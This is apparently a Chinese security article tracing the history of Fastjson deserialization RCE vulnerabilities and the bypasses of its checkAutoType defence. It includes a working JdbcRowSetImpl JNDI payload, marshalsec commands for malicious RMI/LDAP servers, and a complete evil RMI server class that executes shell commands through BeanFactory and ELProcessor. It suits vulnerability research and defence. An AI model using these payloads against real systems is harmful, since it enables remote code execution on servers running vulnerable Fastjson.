# Fastjson RCE漏洞的绕过史
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
Author:平安银行应用安全团队-Glassy
## 引言
最近一段时间fastjson一度成为安全圈的热门话题，作为一个是使用十分广泛的jar包，每一次的RCE漏洞都足以博得大众的眼球，关于fastjson每次漏洞的分析也已经早有大牛详细剖析，本文章旨在顺着17年fastjson第一次爆出漏洞到现在为止，看一下fastjson的缝缝补补，瞻仰一下大佬们和安全开发人员的斗智斗勇，对期间的漏洞做一个汇总，获悉其中漏洞挖掘的一些规律。
## Fastjson RCE关键函数
DefaultJSONParser. parseObject() 解析传入的json字符串提取不同的key进行后续的处理
TypeUtils. loadClass() 根据传入的类名，生成类的实例
JavaBeanDeserializer. Deserialze() 依次调用@type中传入类的对象公有set\get\is方法。
ParserConfig. checkAutoType() 阿里后续添加的防护函数，用于在loadclass前检查传入的类是否合法。
## 历史fastjson漏洞汇总与简析
### fastjson RCE漏洞的源头
首先来看一次fastjson反序列化漏洞的poc
    {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit"," "autoCommit":true}
先看调用栈
    Exec:620, Runtime  //命令执行
    …
    Lookup:417, InitalContext   /jndi lookup函数通过rmi或者ldap获取恶意类
    …
    setAutoCommit:4067, JdbcRowSetImpl 通过setAutoCommit从而在后面触发了lookup函数
    …
    setValue:96, FieldDeserializer //反射调用传入类的set函数
    …
    deserialze:600,  JavaBeanDeserializer 通过循环调用传入类的共有set,get,is函数
    …
    parseObject:368, DefaultJSONParser 解析传入的json字符串
    …
第一版的利用原理比较清晰，因为fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数，因此我们在寻找利用类的时候思路如下：
  1. 类的成员变量我们可以控制
  2. 想办法在调用类的某个set\get\is函数的时候造成命令执行
于是便找到了JdbcRowSetImpl类，该类在setAutoCommit函数中会对成员变量dataSourceName进行lookup，完美的jndi注入利用。
关于jndi注入的利用方式我在这里简单提一下，因为jndi注入的利用受jdk版本影响较大，所以在利用的时候还是要多尝试的。
注：利用之前当然要先确定一下漏洞是否存在，通过dnslog是个比较好用的法子。
  1. 基于rmi的利用方式
适用jdk版本：JDK 6u132, JDK 7u122, JDK 8u113之前
利用方式：
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.RMIRefServer
    http://127.0.0.1:8080/test/#Expolit
  2. 基于ldap的利用方式
适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前
利用方式：
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalc.jndi.LDAPRefServer
    http://127.0.0.1:8080/test/#Expolit
  3. 基于BeanFactory的利用方式
适用jdk版本：JDK 11.0.1、8u191、7u201、6u211以后
利用前提：因为这个利用方式需要借助服务器本地的类，而这个类在tomcat的jar包里面，一般情况下只能在tomcat上可以利用成功。
利用方式：
    public class EvilRMIServerNew {
        public static void main(String[] args) throws Exception {
            System.out.println("Creating evil RMI registry on port 1097");
            Registry registry = LocateRegistry.createRegistry(1097);
            //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
            ref.add(new StringRefAddr("forceString", "x=eval"));
            //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/sh','-c','open /Applications/Calculator.app/']).start()\")"));
            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
            registry.bind("Object", referenceWrapper);
        }
    }
### fastjson RCE漏洞的历次修复与绕过
fastjson在曝出第一版的RCE漏洞之后，官方立马做了更新，于是就迎来了一个新的主角，checkAutoType()，在接下来的一系列绕过中都是和这个函数的斗智斗勇。
先看一下这个函数的代码
    public Class checkAutoType(String typeName, Class expectClass, int features) {
        if (typeName == null) {
            return null;
        } else if (typeName.length() >= 128) {
            throw new JSONException("autoType is not support. " + typeName);
        } else {
            String className = typeName.replace('$', '.');
            Class clazz = null;
            int mask;
            String accept;
            if (this.autoTypeSupport || expectClass != null) {
                for(mask = 0; mask < this.acceptList.length; ++mask) {
                    accept = this.acceptList[mask];
                    if (className.startsWith(accept)) {
                        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false);
                        if (clazz != null) {
                            return clazz;
                        }
                    }
                }
                for(mask = 0; mask < this.denyList.length; ++mask) {
                    accept = this.denyList[mask];
                    if (className.startsWith(accept) && TypeUtils.getClassFromMapping(typeName) == null) {
                        throw new JSONException("autoType is not support. " + typeName);